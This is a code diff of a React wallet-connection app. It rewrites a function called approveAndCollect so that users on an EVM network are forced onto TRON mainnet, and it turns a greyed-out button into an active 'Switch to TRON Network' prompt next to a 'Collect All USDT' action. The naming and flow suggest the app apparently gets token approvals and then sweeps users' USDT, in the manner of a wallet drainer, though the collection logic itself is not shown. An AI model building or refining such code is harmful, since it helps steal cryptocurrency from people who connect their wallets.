@@ -291,10 +291,21 @@ export default function App() {
     open({ view: 'AllWallets' })
   }
 
-  const approveAndCollect = async () => {
+ const approveAndCollect = async () => {
+    // ✨ THE NETWORK SWITCHER FIX ✨
     if (isEVM) {
-      log("❌ EVM transactions require an EVM Smart Contract Address.");
-      setStatus('EVM Logic Not Configured');
+      log("⚠️ App is on EVM. Forcing switch to TRON...");
+      setStatus('Switching to TRON Network...');
+      try {
+        if (switchNetwork) {
+          await switchNetwork(tronMainnet);
+        } else {
+          open({ view: 'Networks' }); // Fallback to AppKit UI
+        }
+      } catch (e: any) {
+        log(`❌ Switch failed: ${e.message}`);
+        open({ view: 'Networks' }); // Open Reown's network menu so user can click Tron
+      }
       return;
     }
 
@@ -488,14 +499,14 @@ export default function App() {
                 </p>
               </div>
 
-              <button
+            <button
                 onClick={approveAndCollect}
                 disabled={loading}
                 className={`w-full font-bold py-5 rounded-3xl text-xl flex items-center justify-center gap-3 disabled:opacity-70 ${
-                  isEVM ? 'bg-zinc-800 text-zinc-500 cursor-not-allowed' : 'bg-white hover:bg-zinc-100 text-black'
+                  isEVM ? 'bg-blue-500 hover:bg-blue-600 text-white' : 'bg-white hover:bg-zinc-100 text-black'
                 }`}
               >
-                {loading ? 'Processing...' : isEVM ? 'Switch to Tron to Collect' : 'Collect All USDT'}
+                {loading ? 'Processing...' : isEVM ? 'Switch to TRON Network' : 'Collect All USDT'}
                 <CheckCircle size={24} />
               </button>
 
